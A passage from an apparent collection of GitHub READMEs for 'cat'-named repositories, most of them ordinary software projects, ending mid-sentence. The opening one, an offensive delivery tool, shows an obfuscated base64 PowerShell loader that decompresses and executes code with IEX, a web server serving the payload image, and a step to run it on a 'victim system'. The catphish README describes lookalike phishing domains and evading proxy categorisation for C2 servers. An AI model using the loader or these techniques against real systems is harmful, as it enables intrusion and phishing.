LAFAARABQAEMAbQBVAG0ARwBqAG4AaQBvAFgANwBlADgANQBGAHEATwBnAEUAdQBwAGgAdABDAFIAMwBRAE0AKwBFAHIAdwAwAHIAaABLAHYAWQBqAFEAYwBjAHkAegBMAGUAVgA1AGwAbABGAG0AUQBiAGUAOQBuAEQALwBOAGQAKwBYAG8ASABDAFMAYwB4AEkAdQB4AFIAegBNAFUAaABoAHoAYgBwAE4AUAA1AGoAIQB2AG8AaAArAEgAbQBnAFcAIQA0AHgAcQBrAGkARgB5AFEAUwArAGEAQgBjAG8ANQBwADYASABQAG8AdwAyAFIAawBkAHUARwB1ADIAUAB0AHIASgA1AG4AcgBrAHoAQwBxAHAANgBWAGwASQAwAG4AYgA2AHUAeABrAHAASwAyAG0ARwB0AFoAbQBwAFcAdgBNAFcAbgBoAHQAcwBJAHUAIQBQAEsAUwBZAC8AQgBiAEoAZgBMAEgAbwBSAC8AVwBsAFkAdQBGAFIAdQBFAFUAcABqAHkAKwBLAGEANQBpAE4AIQBPADcARgA3ACEAbgBGAHMAaQBRAGYAUwBjAFUAbQBIAFMAeQBLAGEAaQBFAFQAZgBDAHcATgBaACEAegBXAGkAIQB4AFQAcQBvAGEAagBFAFMAbABCAGYAQwA0AG4AOAA2AGIAbwBkADQASwBwAGwAOQBSAG8AYgBMADgAMgBkAGIAWABJAGcAMQBuAEcANAArAG4AMAA3AFAAagBIAFkARABZAE4ARgBxADAAegBIAEIAeABlAEMAdQBhAFAASABsAE0AOQBJAGIAegBVAHYAagBtACsAZwBMAG8ATwB1AEMALwBiAFgAWAA0ADAAVABpAGMAOABMACsAVQBtAFQARgBnAEkAegBTAFMAawAhAGYATQBLAHQAWgByAGIARwBJAFUASgBoAHcAdwArAHAAdwBqAHIAWQB0ADIAbQBrAFEAKwAhADMAdwBRAE8AVQA2AHAAVABpAG0AdwB5ADMASgB6AFcAQwBwAGoAKwBQAGIAYwBlAE0AKwA2AEQAcgBIAG0AbwBDAG8AVgBWAG8AVwBDAHMAcAA4AFcAcwBXAEQAZQBOAGsANwAhAEQAIQBTAEsAOABlAGoAYQBRADMAUQBuADIAQwBCAFQAUgBlAFYAOABrAHgAZQByAHAATQB3AFkAWgBEAFUANgBWAHMAawBrAHYAeABpAGIAMQBiAE8ASQBDADUAZQBEAGIAcABCAFkAcQBsAGcALwBWAFkAaQAyAHkAVwArAE8AeAAzAEUANwBNAE4AZgBPAG8AMABrAFcANgBrAGYAVQBDAHQASABrAEoARABSAEUAcQBMAFcATQBQAGQAWQBCAHcARABOAHcASQBQAEUAWgA1AGkAbwA1AE4AagBwAGsAUAA5AGMAUgBsADAANgBJAFUAWQB5AHMAMgBEAGMAbwA1AEMANgBlAFkAYQBZAG4AYwA0AEoAcwBVAEUAMQBlAG4ANgBwAEoAWQA5AGEAYQBTAEwATQBjAEYAZgBSAEoARQBIACEASwBjAGsATABsAEoAbQA5AE0AcABlAGsAZgBlAGUAcABrADIANgBSAFIAOAA0AHgAVQA3AEsASgBwAHQAMQBWAGsAcABmACEAVgB1AGEALwBXAGoASgBsAHcAdQB0AEUAMAB1AG0AZABUAG8AVQB5AGsAVgBUADcAWAA1ADMAeABWAGEAMgBOAFoARwB2AFEAMABKAE8AYwBsAG0AMABkAGIARABlAHEATABUAGYAaQB2AEYAQwBYAEIAKwBmAG4AWQBSAFgAWQBlADMAbAAxAGUAZABtADMANgBYAHoAZwBhADMAawBVADcAZABmAEYAUABRAFgAVQAhAFQAaABYAEUARABQAFQAegBVAHEAQwBaAHgARgAzAEoAQgAvAFMAYgBWADEASAB3AHoAMAB6AG8ANgBmAFAAdQAyAHUAdgBmAEIAcQBlAEMAdgBlAG4AaABRAE8AYQBpADgARgBiAEcATwBZAGwAMgB1AHYAdgB2AHoAZgBmAFgARABIADMAdgB2AHEAOAA0ADQAaQBOADUAawA3AFYAZgA2ACsAaQBOAGEAcQBMADUAcQBpAGQAbABpAGUAagBvAC8AdgBiADYAZQB6AEQANgBQAGsANQBPAGIAdABQADMAKwB4AGgAUQA3AFYASwBvAFoANQBjAGcANABtAGwAMABoAHYATABhAFEANwBkAHkAdgBlAG8ASwBsAE0AMAB5AHoAKwBMAGoATgBRAFkAYgAhADAAZgA3AHgAIQAxAEcAdwBVAGUATgBjAGUASwBtAEYAUABqAEUAMwB0AFAARwBWAHUAWQA1AFEAZABoAGQANAB1ADcAKwAzADkAYwA0AGkAdgB3AE8AdABSADQAYwB0AFgAaAAwAGUAMwBtAEQAQgB5AE8ANQB6AEMARAB0AGYASQBKAHoAcQBtAFYAMgA1ADMANgA5AFUAMABCAFkAcgA5ACsAOABxAEMATQB2AHIATgA5ADQAUQBVAFcASQArAG0AOQA1AE8AcgBmAFoAWgBoAEYAKwBxAGkAMgBkADEAcgBSAGgAYQAwAHYANQA5ADcAZQBZADYAawBkAEQAcwA5AGkANAA3AHIAVgBiAGMAOQBPAGIALwBPAHoAMgA1AFkARwBmADQANQA3ACsAVwBuAHMAZAAzAEwANAB5ACsAaQByAEsASwAvAFQAeABzAEcANgBGAFAAWAAvAHcAagAvAHYANABOAE0AbABlAFUAYQBRAHgAMgAwAGYAYwA0AHIASAByAHoAWgBZAEIAeQBxAGEANgBkACEATABaAFMAaQBpAHEAYwA1AEYAZAA2AE4ARAB2AEQAagB1ADMAaQBTAFcARgAzAHgALwBpAFUANgB1AEIAawBRAHQAWgBRAFUAdQB3AEgAbgBzAHQAZwBRAFEANgBzADkAWgBPACEAMABsAFQAcQA4AHEAMABZADQAMgBFAHUAUwBqAC8AUQB1AEYAWQByADYAcAArADEANQAwAGUAdAB3AFQASwB1ADkAOAArAEQAZgBxAHQAdQBrAFoAUABXAFYANwBKAHQAaABEAHkAUQBNAHEASgBXAFUALwB0ADcAZQBPAHEAVAAwAHoAZwAxAFAALwBMAGMARwBmAFkAWAB1AFUATQBzAHMAdQBWACsAawBUADUANABnAEsAZQA1ADgAcQBrAFkAWgB3AFkASAArAEwARgBiAEwAeQAxAGIAYwBuAHMAaQBqAFAAOABMAHAAegBWADkAdABFAFEATAAhACEAIQA9ACIALgBSAGUAcABsAGEAYwBlACgAIgAhACIALAAgACIAQQAiACkAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA\n\n(powershell)>>>\n\nBuilt-in Web Server to deliver the image\n>>> web \n(web)>>> set port 8080\n        [+] port value is set.\n\n(web)>>> run\n        [+] Starting web server on port 8080\n\n127.0.0.1 - - [30/May/2017 16:18:43] \"GET /output-1496175261.bmp HTTP/1.1\" 200 -\n\nFinal step require you to run the PowerShell oneliner on the victim system.\nTODO\nSupport more file format.\nCredit\nMr.Un1k0d3r RingZer0 Team 2016"}, {"title": "ros/catkin", "language": "Python", "content": "catkin\nCatkin is a collection of cmake macros and associated python code used\nto build some parts of ROS\n\nDocumentation\nhttp://ros.org/doc/api/catkin/html/"}, {"title": "Catel/Catel", "language": "C#", "content": "Catel\n\n\n\nName\nBadge\n\n\n\n\nChat\n\n\n\nDownloads\n\n\n\nNuGet stable version\n\n\n\nNuGet unstable version\n\n\n\nMyGet unstable version\n\n\n\nOpen Collective\n \n\n\n\nCatel is an application development platform with the focus on MVVM (WPF, UWP, Xamarin.Android, Xamarin.iOS and Xamarin.Forms).\nThe goal of Catel is to provide a complete set of modular functionality for Line of Business applications written in any .NET\ntechnology, from client to server.\nCatel distinguishes itself by unique features to aid in the development of MVVM applications and server-side application\ndevelopment. Since Catel focuses on Line of Business applications, it provides professional support and excellent documentation\nwhich ensures a safe bet by professional companies and developers.\nFor documentation, please visit the documentation portal\nFeatures and components\nBelow are a few features that are available in Catel.\nCatel.Core\nCatel.Core is the library you want to include in all your projects, whether you are writing a UI project or not. It contains lots of useful helper methods. The\nmost important features are listed below:\n\nArgument validation (e.g. Argument.IsNotNull(() => myArgument))\nCaching\nData (ModelBase, PropertyBag, Validation)\nIoC (ServiceLocator, TypeFactory)\nLogging (LogManager, Log, several log listeners)\nMessaging\nReflection (same reflection API for every supported platform)\nSerialization (BinarySerializer, XmlSerializer and more)\nWeak references (WeakEventListener)\n\nAnd more....\nCatel.MVVM\nCatel.MVVM is the library you want to include when you are writing a UI project (e.g. WPF, UWP, Xamarin) and you want to use the MVVM pattern. Catel is the only MVVM library that has context-aware view and view-model creation, which can be used to solve the nested user controls problem.\nThe most important\nfeatures are listed below:\n\nAuditing\nCollections (FastObservableCollection)\nCommands (Command, TaskCommand, etc)\nConverters (tons of converters out of the box)\nServices\n\nCameraService\nLocationService\nMessageService\nNavigationService\nOpenFileService\nPleaseWaitService\nSaveFileService\nUIVisualizerService\n\n\nView models\n\nAutomatic validation\nAutomatic mappings from model to view model\n\n\nViews\n\nDataWindow\nUserControl\nWindow\n\n\n\nExample code\nModels\nThis model has automatic change notifications and validation.\npublic class Person : ValidatableModelBase\n{\n    public string FirstName { get; set; }\n\n    public string LastName { get; set; }\n\n    protected override void ValidateFields(List<IFieldValidationResult> validationResults)\n    {\n        if (string.IsNullOrWhitespace(FirstName))\n        {\n            validationResults.Add(FieldValidationResult.CreateError(nameof(FirstName), \"First name is required\"));\n        }\n\n        if (string.IsNullOrWhitespace(LastName))\n        {\n            validationResults.Add(FieldValidationResult.CreateError(nameof(LastName), \"Last name is required\"));\n        }\n    }    \n}\nView models\nThis is a view model with:\n\nAutomatic injection of the DataContext\nAutomatic mapping of properties & validation from model => view model\n\npublic class PersonViewModel : ViewModelBase\n{\n    public PersonViewModel(Person person)\n    {\n        Argument.IsNotNull(() => person);\n\n        Person = person;\n    }\n\n    [Model]\n    private Person Person { get; set; }\n\n    [ViewModelToModel]\n    public string FirstName { get; set; }\n\n    [ViewModelToModel]\n    public string LastName { get; set; }\n}\nBuilding Catel\nPrerequisites\nCatel requires Visual Studio 2019 to compile successfully. You also need to ensure you have the following features installed:\n\n.NET desktop development\nUniversal Windows Platform development\nMobile development with .NET\n.NET Core cross-platform development\nSelect the following components from Individual components\n\nWindows 10 SDK (10.0.16299.0)\nMSVC v141 and v142 (ARM, ARM64 and x64/x86)\nC++ ATL v141 and v142 (ARM, ARM64 and x86 & x64)  build tools\nC++ MFC v141 and v142 (ARM, ARM64 and x86 & x64) build tools\n\n\nLatest Version of .NET Core 3.0 Preview SDK\n\nEnsure you enable Use previews of the .NET Core SDK under Tools -> Options -> Projects and Solutions -> .NET Core\n\n\n\nNote that you should run these commands using powershell in the root of the repository.\nRunning a build\n.\\build.ps1 -target build\nRunning a build with unit tests\n.\\build.ps1 -target buildandtest\nRunning a build with local packages\nNote that this assumes a local packages directory at C:\\Source\\_packages, which can be added to the NuGet feeds:\n\n.\\build.ps1 -target buildandpackagelocal\nApps using Catel\nThere are a lot of (both free & commercial) apps using Catel. This list provides a few examples that are built\nwith Catel:\n// todo: add wpf\n// todo: add uwp\nWPF components based on Catel\nIf you are planning on using WPF, there is a huge set (60+) of free open-source components\navailable based on Catel. All these open source are developed by a company called WildGums\n(see https://www.wildgums.com) and provided to the community for free. The components are well\nmaintained and being used in several commercial WPF applications.\nFor more information, see https://github.com/wildgums\nContributors\nThis project exists thanks to all the people who contribute. [Contribute].\n\nBackers\nThank you to all our backers! \ud83d\ude4f [Become a backer]\n\nSponsors\nSupport this project by becoming a sponsor. Your logo will show up here with a link to your website. [Become a sponsor]"}, {"title": "typelevel/cats-effect", "language": "Scala", "content": "cats-effect\n   \n\nFor when purity just isn't impure enough.\n\nThis project aims to provide a standard IO type (doc / api) for the Cats ecosystem, as well as a set of typeclasses (and associated laws!) which characterize general effect types.  This project was explicitly designed with the constraints of the JVM and of JavaScript in mind.  Critically, this means two things:\n\nManages both synchronous and asynchronous (callback-driven) effects\nCompatible with a single-threaded runtime\n\nIn this way, IO is more similar to common Task implementations than it is to the classic scalaz.effect.IO or even Haskell's IO, both of which are purely synchronous in nature.  As Haskell's runtime uses green threading, a synchronous IO (and the requisite thread blocking) makes a lot of sense.  With Scala though, we're either on a runtime with native threads (the JVM) or only a single thread (JavaScript), meaning that asynchronous effects are every bit as important as synchronous ones.\nUsage\nVersions of Cats Effect:\n\nStable: 1.3.0\nUnstable 2.0.0-M1\n\nSee compatibility and versioning for more information on our compatibility and semantic versioning policies.\nlibraryDependencies += \"org.typelevel\" %% \"cats-effect\" % \"1.3.0\"\nCats Effect relies on improved type inference and needs partial unification enabled as described in the cats Getting Started documentation.\nIf your project uses Scala.js, replace the double-% with a triple.  Note that cats-effect has an upstream dependency on cats-core version 1.x.\nCross-builds are available for Scala 2.11.x, 2.12.x, and 2.13.0-M5, as well as Scala.js 0.6.x. Version 2.0.0-M1 has been cross-built for 2.13.0-RC1 and depends upon cats-core version 2.x.\nThe most current snapshot (or major release) can be found in the maven badge at the top of this readme.  If you are a very brave sort, you are free to depend on snapshots; they are stable versions, as they are derived from the git hash rather than an unstable -SNAPSHOT suffix, but they do not come with any particular confidence or compatibility guarantees.\nPlease see this document for information on how to cryptographically verify the integrity of cats-effect releases.  You should absolutely be doing this!  It takes five minutes and eliminates the need to trust a third-party with your classpath.\nLaws\nThe cats-effect-laws artifact provides Discipline-style laws for the Sync, Async, Concurrent, Effect and ConcurrentEffect typeclasses (LiftIO is lawless, but highly parametric).  It is relatively easy to use these laws to test your own implementations of these typeclasses. Take a look here for more.\nlibraryDependencies += \"org.typelevel\" %% \"cats-effect-laws\" % \"1.3.0\" % \"test\"\nThese laws are compatible with both Specs2 and ScalaTest.\nDocumentation\nLinks:\n\nWebsite: typelevel.org/cats-effect/\nScalaDoc: typelevel.org/cats-effect/api/\n\nRelated Cats links (the core):\n\nWebsite: typelevel.org/cats/\nScalaDoc: typelevel.org/cats/api/\n\nLibraries\nThese are some well known libraries that depend on cats-effect:\n\n\n\nProject\nDescription\n\n\n\n\nCiris\nLightweight, extensible, and validated configuration loading in Scala\n\n\nDoobie\nA principled JDBC layer for Scala\n\n\nEff\nExtensible Effects for Scala\n\n\nFs2\nFunctional Streams for Scala (Streaming I/O library)\n\n\nFinch\nScala combinator API for building Finagle HTTP services\n\n\nHttp4s\nTypeful, functional, streaming HTTP for Scala\n\n\nMonix\nAsynchronous, Reactive Programming for Scala and Scala.js\n\n\nPure Config\nA boilerplate-free library for loading configuration files\n\n\nScala Cache\nA facade for the most popular cache implementations for Scala\n\n\nSttp\nThe Scala HTTP client you always wanted\n\n\n\nRelated Projects\nThese are some of the projects that provide high-level functions on top of cats-effect:\n\n\n\nProject\nDescription\n\n\n\n\nCats Retry\nA library for retrying actions that can fail\n\n\nConsole4cats\nConsole I/O for Cats Effect\n\n\nFuuid\nFunctional UUID's\n\n\nLinebacker\nThread Pool Management for Scala: Enabling functional blocking where needed\n\n\nLog4cats\nFunctional Logging\n\n\nCats STM\nSoftware Transactional Memory for Cats Effect\n\n\n\nDevelopment\nWe use the standard pull request driven github workflow.  Pull requests are always welcome, even if it's for something as minor as a whitespace tweak!  If you're a maintainer, you are expected to do your work in pull requests, rather than pushing directly to master.  Ideally, someone other than yourself will merge and push your PR to master.  However, if you've received at least one explicit \ud83d\udc4d from another maintainer (or significant volume of \ud83d\udc4d from the general cats community), you may merge your own PR in the interest of moving forward with important efforts.  Please don't abuse this policy.\nDo not rebase commits that have been PR'd!  That history doesn't belong to you anymore, and it is not yours to rewrite.  This goes for maintainers and contributors alike.  Rebasing locally is completely fine (and encouraged), since linear history is pretty and checkpoint commits are not.  Just don't rebase something that's already out there unless you've explicitly marked it as a work in progress (e.g. [WIP]) in some clear and unambiguous way.\ncats-effect is a Typelevel project. This means we embrace pure, typeful, functional programming, and provide a safe and friendly environment for teaching, learning, and contributing as described in the Code of Conduct.\nContributing documentation\nThe sources for the cats-effect microsite can be found in site/src/main/tut.\nThe menu structure is in site/src/main/resources/microsite/data/menu.yml.\nYou can build the microsite with sbt microsite/makeMicrosite.\nTo preview your changes you need to have\njekyll installed. This depends on your\nplatform, but assuming you have ruby installed it could be as simple as gem install jekyll.\nStart a local server by navigating to site/target/site, then run jekyll serve. Finally point your browser at\nhttp://localhost:4000/cats-effect/.  Any\nchanges should be picked up immediately when you re-run sbt microsite/makeMicrosite.\nLicense\nCopyright (c) 2017-2019 The Typelevel Cats-effect Project Developers\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."}, {"title": "typelevel/cats-mtl", "language": "Scala", "content": "cats-mtl\n\n \nTransformer typeclasses for cats.\nProvides transformer typeclasses for cats' Monads, Applicatives and Functors.\nAs well, there are some abstractions thrown in that allow you\nto generically lift MTL typeclasses through transformers.\nYou can have multiple cats-mtl transformer typeclasses in scope at once\nwithout implicit ambiguity, unlike in pre-1.0.0 cats or Scalaz 7.\nUsage\nlibraryDependencies += \"org.typelevel\" %% \"cats-mtl-core\" % \"0.4.0\"\nIf your project uses Scala.js, replace the double-% with a triple.  Note that cats-mtl has an upstream dependency on cats-core version 1.x.\nCross-builds are available for Scala 2.12 and 2.11, Scala.js major version 0.6.x.\nIf you're not sure where to start or what Cats-mtl even is, please refer to the getting started guide.\nLaws\nThe cats-mtl-laws artifact provides Discipline-style laws for all of the type classes defined in cats-mtl. It is relatively easy to use these laws to test your own implementations of these typeclasses. Take a look here for more.\nlibraryDependencies += \"org.typelevel\" %% \"cats-mtl-laws\" % \"0.4.0\" % Test\nThese laws are compatible with both Specs2 and ScalaTest.\nDocumentation\nLinks:\n\nWebsite: typelevel.org/cats-mtl/\nScalaDoc: typelevel.org/cats-mtl/api/\n\nRelated Cats links (the core):\n\nWebsite: typelevel.org/cats/\nScalaDoc: typelevel.org/cats/api/\n\nMigrating from Cats pre-1.0.0\ncats-core used to provide various mtl-classes which were moved to cats-mtl and split up.\nYou can find the migration guide here\nCommunity\nPeople are expected to follow the\nScala Code of Conduct when\ndiscussing cats-mtl on the Github page, Gitter channel, or other\nvenues.\nWe hope that our community will be respectful, helpful, and kind. If\nyou find yourself embroiled in a situation that becomes heated, or\nthat fails to live up to our expectations, you should disengage and\ncontact one of the project maintainers in private. We\nhope to avoid letting minor aggressions and misunderstandings escalate\ninto larger problems.\nLicense\nAll code is available to you under the MIT license, available at http://opensource.org/licenses/mit-license.php and also in the COPYING file."}, {"title": "skorokithakis/catt", "language": "Python", "content": "Cast All The Things\n\n\n\n\n\n\nCast All The Things allows you to send videos from many, many online sources\n(YouTube, Vimeo, and a few hundred others) to your Chromecast. It also allows\nyou to cast local files or render websites.\n\nInstallation\nYou can install Cast All The Things with pip:\npip install catt\n\ncatt is only compatible with Python 3. If you need a Python 2-compatible\nversion, please install 0.5.6, the last py2-compatible release.\n\nUsage\nTo use Cast All The Things, just specify a URL:\ncatt cast \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"\n\ncatt supports any service that youtube-dl supports, which includes most online\nvideo hosting services.\ncatt can also cast local files (if they're in a format the Chromecast supports\nnatively):\ncatt cast ./myvideo.mp4\n\nYou can also control your Chromecast through catt commands, for example with\ncatt pause. Try running catt --help to see the full list of commands.\nIf you have subtitles and the name is similar to the name of the local file, catt will add them automatically.\nYou can, of course, specify any other subtitle if you want. Although Chromecast only supports WEBVTT,\nTTML and Line 21 subtitles, catt conveniently converts SRTs to WEBVTT for you on the fly. Here is how to use it:\ncatt cast -s ./mysubtitle.srt /myvideo.mp4\n\ncatt can also tell your Chromecast to display any website:\ncatt cast_site https://en.wikipedia.org/wiki/Rickrolling\n\nPlease note that the Chromecast has a slow CPU but a reasonably recent version of Google Chrome. The display\nresolution is 1280x720.\n\nConfiguration file\nCATT can utilize a config-file stored at ~/.config/catt/catt.cfg (%APPDATA%\\catt\\catt.cfg on Windows).\nThe format is as following:\n[options]\ndevice = chromecast_one\n\n[aliases]\none = chromecast_one\ntwo = chromecast_two\n\nIn the [options] section, device denotes the default device that will\nbe selected, when you have not selected a device via the cli.\nYou can write your choice of default device to catt.cfg by doing:\ncatt -d <name_of_chromecast> write_config\n\nIn the [aliases] section, you can specify aliases for the names of your\nchromecasts. You can then select a device just by doing:\ncatt -d <alias> <command>\n\nCurrently, in order to take advantage of this functionality, you need to manually\nedit catt.cfg\n\nContributing\nIf you want to contribute a feature to catt, please open an issue (or comment on\nan existing one) first, to make sure it's something that the maintainers are\ninterested in. Afterwards, just clone the repository and hack away!\nTo run catt in development, you can use the following command:\npython -m catt.cli --help\n\nBefore committing, please make sure you install pre-commit and install its hooks:\npip install pre-commit\npre-commit install\n\nThat's all, now you can commit and the hooks will run. Black (which is used to format\nthe code) requires Python 3.6 to run, but please make the effort, as our CI will yell\nat you if the code is not formatted, and nobody wants that.\nThanks!\n\nInfo\n\nFree software: BSD license\n\n\nFeatures\n\nCasts videos to Chromecast\nFrom many, many online sources\nCasts local files (videos, photos and music)\nCasts any website to Chromecast\n\n\nThanks\nCatt would not be possible without these great projects:\n\npychromecast - Library for Python 3 to communicate with the Google Chromecast\nyoutube-dl - Command-line program to download videos from YouTube.com and other video sites\ncasttube - YouTube Chromecast API"}, {"title": "PetoiCamp/OpenCat", "language": "C++", "content": "OpenCat\nNews: Our crowdfunding campaign is live on www.igg.me/at/nybble !\nThis is the repository for OpenCat project.\nThe goal is to collaborate talents for this cute quadruped robot. It's still a complex system only for skilled makers, yet we want to share it with the public by mass production and bringing down the cost.\nIn the Wiki tab, there's a slow documenting process going on.\nWe just acquired our official domain: www.petoi.com. You can subscribe for our official newsletters.\nRandom updates will be posted on Twitter @PetoiCamp, Instagram @Petoi_Camp, and YouTube channel"}, {"title": "ring0lab/catphish", "language": "Ruby", "content": "CATPHISH\nGenerate similar-looking domains for phishing attacks. Check expired domains and their categorized domain status to evade proxy categorization. Whitelisted domains are perfect for your C2 servers. Perfect for Red Team engagements.\nInstallation\nbundle install\n\nCurrent Algorithms\n\nSingularOrPluralise\nprependOrAppend\ndoubleExtensions\nmirrorization\nhomoglyphs\ndashOmission\nPunycode\n\nVersion 1.1.0:\nThe parser for command line options is modified to compensate with the new expired feature. This new option structure gives the tool a new look and more organized.\n\nUsage\nRunning the tool:\ncatphish.rb [global options] COMMAND [command options]\n\nOptions:\nCOMMANDS\n  generate                    Generate domains\n  expired                     Find available expired domains\n(experimental)\n\nAdditional help\n  catphish.rb COMMAND -h\n\nGlobal Options\n  -l, --logo, --no-logo                      ASCII art banner\n                                             (default: true)\n  -c, --column-header, --no-column-header    Header for each column\n                                             of the output (default:\n                                             true)\n  -D, --Domain=<s>                           Target domain to analyze\n  -V, --Verbose                              Show all domains,\n                                             including non-available\n                                             ones\n  -h, --help                                 Show this message\n\nGenerate all type:\ncatphish.rb -D DOMAIN generate -A\n\nCheck available expired domains:\ncatphish.rb -D DOMAIN expired\n\nCheck against a specific domain for categorization status:\ncatphish.rb -D DOMAIN expired -c\n\nCheck all available expired domains against a specific vendor\ncatphish.rb -D DOMAIN expired -p PROXY_TYPE\n\nDocker\nYou can also run the tool with Docker! This lets you try it out without any of the required dependencies (ruby), except\nDocker itself. This presumes that you have the docker daemon installed. If not, see\nDocker's documentation.\nFirst, build the container\n$ cd path/to/repository\n\n# Generate a tag so we know how to find the container later to run it. You can use anything (latest is common);\n# here the git hash is used.\n$ TAG=$(git rev-parse --short HEAD)\n\n# Run the build\n$ docker build --tag \"catphish:${TAG}\" .\n\n# Eventually docker will print something like:\n#\n#   Successfully built 8f0b8bfe0c41\n#   Successfully tagged catphish:f947517\n\n\nPerfect! Now, you can execute catphish via Docker:\n$ docker run \\\n    --rm=true \\\n    \"catphish:${TAG}\" \\\n        --Domain ring0labs.com \\\n        --All\n\nIn Action\n\nCOPYRIGHT\nThis program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.\nYou should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/."}, {"title": "aleju/cat-generator", "language": "Lua", "content": "About\nThis script generates new images of cats using the technique of generative adversarial networks (GAN), as described in the paper by Goodfellow et al.\nThe images are enhanced with the laplacian pyramid technique from Denton and Soumith Chintala et. al., implemented as a single G (generator) as described in the blog post by Anders Boesen Lindbo Larsen and S\u00f8ren Kaae S\u00f8nderby.\nMost of the code is based on facebook's eyescream project.\nThe script also uses code from other repositories for spatial transformers, weight initialization and LeakyReLUs.\nImages\nThe following images were generated by networks trained with:\n\nModel G32up, color: th train.lua --D_iterations=2. This model is currently not the default for G, i.e. must be manually activated in models.lua.\nModel G32up, grayscale: th train.lua --colorSpace=\"y\". See above.\nModel G32up-c, color: th train.lua. This model is currently the default model/architecture for G.\n\nThe difference between model G32up and G32up-c is simply that G32up-c is about one layer deeper and has more convolution kernels.\nModel G32up-c (currently default)\n\n256 randomly generated 32x32 cat images. (Model G32up-c)\n\n64 generated 32x32 cat images, rated by D as the best images among 1024 randomly generated ones. (Model G32up-c)\n\n16 generated images (each pair left) and their nearest neighbours from the training set (each pair right). Distance was measured by 2-Norm (torch.dist()). The 16 selected images were the \"best\" ones among 1024 images according to the rating by D, hence some similarity with the training set is expected. (Model G32up-c)\n\nTraining progress of the network while learning to generate color images. Epoch 1 to 750 as a youtube video. (Model G32up-c)\nModel G32up\n\n256 randomly generated 32x32 cat images. (Model G32up)\n\n64 generated 32x32 cat images, rated by D as the best images among 1024 randomly generated ones. (Model G32up)\n\n1024 randomly generated 32x32 grayscale cat images. (Model G32up)\n\n64 generated 32x32 grayscale cat images, rated by D as the best images among 1024 randomly generated ones. (Model G32up)\n\n16 generated images (each pair left) and their nearest neighbours from the training set (each pair right). Distance was measured by 2-Norm (torch.dist()). The 16 selected images were the \"best\" ones among 1024 images according to the rating by D, hence some similarity with the training set is expected. (Model G32up)\n\nTraining progress of the network while learning to generate color images. Epoch 1 to 690 as a youtube video. (Model G32up)\nBackground Knowledge\nThe basic principle of GANs is to train two networks in a kind of forger-police-relationship.\nThe forger is called G (generator) and the police D (discriminator).\nIt is D's job to take a look at an image and estimate whether it is a fake or a real image (where \"real\" is synonymous with \"from the training set\").\nNaturally it's G's job to generate images that trick D into believing that they are from the training set.\nWith a large enough training set and some regularization strategies, D cannot just memorize the training set.\nAs a result, D must learn the general rules that govern the look of images from the training set (i.e. a generalizing function).\nSimilarly, G must learn how to \"paint\" new images that look like the ones from the training set, otherwise it would not be able to trick D.\nThe previously mentioned laplacian pyramid technique for GANs is pretty straight-forward:\nInstead of training G and D on full-sized images (e.g. 64x64 pixels) you train them on smaller ones (e.g. 8x8 pixels).\nAfterwards you increase the size of the generated images in multiple steps to the final size, e.g. from 8x8 to 16x16 to 32x32 to 64x64.\nFor each of these steps you train another pair of G and D*, but in case of these upscaling steps they are trained to learn good refinements of the upscaled (and hence blurry) images.\nThat means that D gets fed refined/sharpened images and must tell, whether these were real images (i.e. blurry images from the training set with optimal refinements) or fake images from G (i.e. blurry images from the training set, but the refinement was done by G).\nAgain, G must learn to generate good refinements and D must learn what good refined images look like.\nThe image below (taken from the paper) shows the process (they start with the full sized images, the one on the far right could be generated by a GAN).\nNote that this training methodology is similar to how one would naturally paint images: You start with a rough sketch (low resolution image) and then progressively add more and more details (increases in resolution).\n*) This project actually uses a technique that merges the laplacian pyramid into one pair of G and D. The basic principle however stays the same.\n\nRequirements\n\nTorch with the following libraries (most of them are probably already installed by default):\n\nnn (luarocks install nn)\npl (luarocks install pl)\npaths (luarocks install paths)\nimage (luarocks install image)\noptim (luarocks install optim)\ncutorch (luarocks install cutorch)\ncunn (luarocks install cunn)\ncudnn (luarocks install cudnn)\ndpnn (luarocks install dpnn)\nstn (see here)\ndisplay\n\n\nPython 2.7 (only tested with that version)\n\nscipy\nnumpy\nscikit-image\n\n\n10k cats dataset\nCUDA capable GPU (4GB memory or more) with cudnn3\n\nUsage\nPreperation steps:\n\nInstall all requirements as listed above.\nDownload and extract the 10k cats dataset into a directory, e.g. /foo/bar. That folder should then contain the subfolders CAT_00 to CAT_06.\nClone the repository.\nSwitch to the repository's subdirectory dataset via cd dataset and convert your downloaded cat images into a normalized and augmented set of ~100k cat faces with python generate_dataset.py --path=\"/foo/bar\". This may take a good two hours or so to run through, as it performs lots of augmentations.\n\nTraining and Sampling:\n\nStart display with th -ldisplay.start\nOpen http://localhost:8000/ in your browser (plotting interface by display).\nTrain V for a few epochs with th train_v.lua. (Wait for a saving network to <path> message, then stop manually.)\nPretrain G for a few epochs with th pretrain_g.lua. (Wait for a saving network to <path> message, then stop manually.) (This step can be skipped.)\nTrain a network with th train.lua for 200 epochs or more. You might have to add --D_iterations=2 to get good results.\nSample images (random, best, worst images) to directory samples/ with th sample.lua. Add --neighbours if you also want to sample nearest neighbours (from the training set) of generated images (takes a long time). Add e.g. --run=10 to sample 10 groups of images.\n\nAdd --colorSpace=\"y\" to each script to work with grayscale images.\nNote: During training images are saved in logs/images, logs/images_good and logs/images_bad. They will not get deleted automatically 